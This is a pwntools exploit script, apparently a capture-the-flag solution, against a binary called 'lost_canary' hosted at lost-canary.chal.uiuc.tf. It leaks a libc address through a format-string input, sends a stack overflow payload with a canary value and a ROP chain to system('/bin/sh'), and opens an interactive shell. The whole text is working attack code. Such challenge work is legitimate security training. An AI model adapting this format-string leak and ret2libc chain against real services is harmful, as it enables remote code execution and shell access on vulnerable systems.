from pwn import *

binary_name = "lost_canary"
exe  = ELF(binary_name, checksec=True)
libc = ELF("libc-2.31.so", checksec=False)
context.binary = exe

if args.REMOTE:
	r = connect("lost-canary.chal.uiuc.tf", 1337, ssl=True)
elif args.GDB:
	r = gdb.debug(f"debug_dir/{binary_name}", """
		c
	""", aslr=False)
else:
	r = process(f"debug_dir/{binary_name}")

r.sendlineafter(b"number: ", b"14927%p")
r.recvuntil(b"14927")
libc.address = int(r.recvline().strip(), 16) - 0x1ed723
info("libc   ---> %#018x", libc.address)

rop = ROP(libc)
rop.raw(rop.ret)
rop.system(next(libc.search(b"/bin/sh\x00")))
r.sendlineafter(b"code:", b"AAAA" + b"eY iEuas" + b"A" * 8 + rop.chain())


r.interactive()
